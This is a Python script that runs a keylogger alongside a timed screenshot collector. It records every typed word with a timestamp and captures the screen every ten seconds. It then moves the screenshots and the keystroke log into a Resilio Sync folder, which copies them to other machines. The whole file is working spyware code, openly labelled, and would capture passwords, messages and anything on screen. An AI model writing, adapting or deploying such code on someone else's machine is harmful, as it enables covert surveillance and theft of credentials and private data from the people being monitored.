import os
import shutil
import time
import datetime
import threading
from pynput import keyboard
import pyautogui

# ===== CONFIG =====
# Base folder for automation (screenshots & keylogger files)
BASE_DIR = os.path.join(os.path.expanduser("~"), "Documents", "AutoScreenshots")
# Folder monitored by Resilio Sync on this system
SYNC_FOLDER = os.path.join(os.path.expanduser("~"), "ResilioSync", "AutoSync")
SCREENSHOT_INTERVAL = 10  # seconds between screenshots
FOLDER_INTERVAL = 60      # seconds before creating new folder
LOG_FILE = os.path.join(SYNC_FOLDER, "keystroke_log.txt")  # keylogger log file

# ===== ENSURE REQUIRED FOLDERS EXIST =====
os.makedirs(BASE_DIR, exist_ok=True)
os.makedirs(SYNC_FOLDER, exist_ok=True)

# ===== CREATE NEW FOLDER FUNCTION =====
def create_new_folder():
    existing_folders = [f for f in os.listdir(BASE_DIR) if f.startswith("folder")]
    numbers = []
    for folder in existing_folders:
        try:
            num = int(folder.replace("folder", ""))
            numbers.append(num)
        except:
            pass
    next_number = max(numbers) + 1 if numbers else 1
    new_folder = os.path.join(BASE_DIR, f"folder{next_number}")
    os.makedirs(new_folder)
    return new_folder

# ===== GLOBAL CURRENT FOLDER =====
SAVE_FOLDER = create_new_folder()
print(f"📁 Created folder: {SAVE_FOLDER}")
print("📸 Screenshot collector started...")

# ===== MOVE FOLDER TO RESILIO SYNC =====
def move_folder_to_sync(folder_path):
    folder_name = os.path.basename(folder_path)
    dest_path = os.path.join(SYNC_FOLDER, folder_name)

    # Avoid duplicates: add timestamp if folder exists
    if os.path.exists(dest_path):
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        dest_path += f"_{timestamp}"

    try:
        shutil.move(folder_path, dest_path)
        print(f"✅ Moved folder to Resilio Sync: {dest_path}")
    except Exception as e:
        print(f"❌ Error moving folder {folder_name}: {e}")

# ===== UPDATE FOLDER EVERY FOLDER_INTERVAL =====
def update_folder():
    global SAVE_FOLDER
    while True:
        time.sleep(FOLDER_INTERVAL)
        old_folder = SAVE_FOLDER
        SAVE_FOLDER = create_new_folder()
        print(f"📁 Switched to new folder: {SAVE_FOLDER}")

        # Move previous folder to Resilio Sync
        move_folder_to_sync(old_folder)

# ===== SCREENSHOT LOOP =====
def screenshot_loop():
    global SAVE_FOLDER
    while True:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        file_path = os.path.join(SAVE_FOLDER, f"screenshot_{timestamp}.png")
        screenshot = pyautogui.screenshot()
        screenshot.save(file_path)
        print(f"✅ Saved screenshot: {file_path}")
        time.sleep(SCREENSHOT_INTERVAL)

# ===== KEYLOGGER =====
current_word = ""
word_count = 0
line_buffer = ""

def save_line():
    global line_buffer
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if line_buffer.strip():
        log = f"{timestamp} | Line: {line_buffer.strip()}\n"
        print(log.strip())
        with open(LOG_FILE, "a") as f:
            f.write(log)
    line_buffer = ""

def on_press(key):
    global current_word
    try:
        char = key.char
        if char:
            current_word += char
    except AttributeError:
        pass

def on_release(key):
    global current_word, word_count, line_buffer
    if key == keyboard.Key.space:
        if current_word:
            word_count += 1
            line_buffer += current_word + " "
            current_word = ""
        if word_count == 5:
            save_line()
            word_count = 0
    elif key == keyboard.Key.enter:
        if current_word:
            line_buffer += current_word
            current_word = ""
        save_line()
        word_count = 0
    elif key == keyboard.Key.esc:
        if current_word:
            line_buffer += current_word
        save_line()
        print("🛑 Keylogger stopped")
        return False

# ===== START THREADS =====
thread_ss = threading.Thread(target=screenshot_loop, daemon=True)
thread_folder = threading.Thread(target=update_folder, daemon=True)

thread_ss.start()
thread_folder.start()

# ===== START KEYBOARD LISTENER =====
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("⌨️ Keylogger started (Press ESC to stop)")
    listener.join()
